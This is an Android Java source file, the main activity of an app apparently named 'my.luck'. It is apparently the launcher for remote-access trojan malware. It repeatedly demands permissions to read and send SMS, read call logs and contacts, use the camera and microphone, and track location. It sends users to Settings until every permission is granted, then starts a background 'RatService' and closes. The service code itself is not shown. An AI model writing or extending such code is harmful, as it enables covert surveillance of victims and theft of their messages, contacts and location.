package com.my.luck;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.core.RatService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Handler handler = new Handler();
    private boolean permissionsRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Small delay to let activity initialize
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkAndRequestPermissions();
            }
        }, 300);
    }

    private void checkAndRequestPermissions() {
        List<String> neededPermissions = new ArrayList<>();

        // Only add permissions that are actually needed and available on this Android version
        neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            // WRITE_EXTERNAL_STORAGE is deprecated on Android 13+
            neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        
        neededPermissions.add(Manifest.permission.READ_SMS);
        neededPermissions.add(Manifest.permission.SEND_SMS);
        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
        neededPermissions.add(Manifest.permission.READ_CONTACTS);
        neededPermissions.add(Manifest.permission.CAMERA);
        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        
        // READ_PHONE_STATE is not needed for basic functionality
        // and causes issues on Android 15
        // neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
        
        neededPermissions.add(Manifest.permission.INTERNET);
        neededPermissions.add(Manifest.permission.ACCESS_NETWORK_STATE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        // Filter out already granted permissions
        List<String> missingPermissions = new ArrayList<>();
        for (String perm : neededPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(perm);
            }
        }

        if (missingPermissions.isEmpty()) {
            // All permissions granted
            startApp();
        } else if (!permissionsRequested) {
            permissionsRequested = true;
            String[] permsArray = missingPermissions.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
        } else {
            // Check if user permanently denied - guide them to settings
            boolean showSettings = false;
            for (String perm : missingPermissions) {
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
                    // User denied but not permanently
                    break;
                } else {
                    showSettings = true;
                }
            }
            
            if (showSettings) {
                Toast.makeText(this, "Please enable all permissions in Settings", Toast.LENGTH_LONG).show();
                // Open app settings
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                finish();
            } else {
                Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
                // Retry after delay
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        permissionsRequested = false;
                        checkAndRequestPermissions();
                    }
                }, 3000);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                startApp();
            } else {
                // Check if any permission was permanently denied
                boolean permanentDeny = false;
                for (String perm : permissions) {
                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
                        permanentDeny = true;
                        break;
                    }
                }
                
                if (permanentDeny) {
                    Toast.makeText(this, "Please enable all permissions in Settings", Toast.LENGTH_LONG).show();
                    Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                    finish();
                } else {
                    Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
                    permissionsRequested = false;
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            checkAndRequestPermissions();
                        }
                    }, 2000);
                }
            }
        }
    }

    private void startApp() {
        try {
            Intent serviceIntent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Toast.makeText(this, "✅ Service started!", Toast.LENGTH_SHORT).show();
            
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 500);
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            finish();
        }
    }
}
